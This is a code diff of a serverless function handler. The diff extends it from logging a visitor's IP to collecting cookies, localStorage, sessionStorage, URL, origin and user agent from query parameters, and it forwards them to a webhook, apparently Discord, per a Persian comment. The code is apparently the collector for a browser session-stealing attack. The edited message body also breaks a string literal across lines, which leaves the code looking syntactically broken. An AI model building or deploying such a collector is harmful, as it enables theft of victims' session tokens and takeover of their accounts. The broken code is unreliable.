@@ -1,4 +1,3 @@
-// pages/index.js
 
 exports.handler = async function (event, context) {
   const ip =
@@ -10,7 +9,14 @@ exports.handler = async function (event, context) {
   const query = event.queryStringParameters;
 
   const log = {
-    ip 
+    ip,
+    cookies: query.cookies,
+    localStorage: query.localStorage,
+    sessionStorage: query.sessionStorage,
+    url: query.url,
+    origin: query.origin,
+    userAgent: query.userAgent,
+    timestamp: new Date().toISOString()
   };
 
   // ارسال به Webhook (مثلاً Discord)
@@ -19,7 +25,11 @@ exports.handler = async function (event, context) {
     headers: {
       'Content-Type': 'application/json'
     },
-    body: JSON.stringify({ content: '```json\n' + JSON.stringify(log, null, 2) + '\n```' })
+    body: JSON.stringify({ content: '
+
+json\n' + JSON.stringify(log, null, 2) + '\n
+
+' })
   });
 
   return {
@@ -27,5 +37,3 @@ exports.handler = async function (event, context) {
     body: 'Logged.'
   };
 };
-
-
